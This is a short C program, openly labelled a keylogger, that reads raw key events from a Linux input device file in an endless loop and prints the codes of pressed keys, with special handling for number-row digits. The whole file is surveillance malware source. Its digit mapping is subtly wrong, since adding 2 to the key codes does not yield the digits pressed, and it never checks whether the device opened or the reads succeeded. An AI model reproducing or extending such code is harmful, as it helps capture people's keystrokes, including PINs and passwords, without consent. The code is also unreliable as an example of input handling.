#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
  if (argc != 2)
  {
    printf("Usage: %s <event-file-path>\n", argv[0]);
    exit(-1);
  }
  printf("Keylogger active...\n");

  int fd = open(argv[1], O_RDONLY, 0);
  //printf("Opened file descriptor: %d\n", fd);

  struct input_event ie;
  char key[100];

  while(1)
  {
    read(fd, &ie, sizeof(ie));
    if (ie.type != EV_KEY)
      continue;
    if (ie.code >= 2 && ie.code <= 10)
    {
        printf("%d\n", ie.code + 2);
    }
    else if (ie.code == 11)
      printf("0");
    else
      printf("Unknown Key pressed: %d\n", ie.code);
  }
  return EXIT_SUCCESS;
}
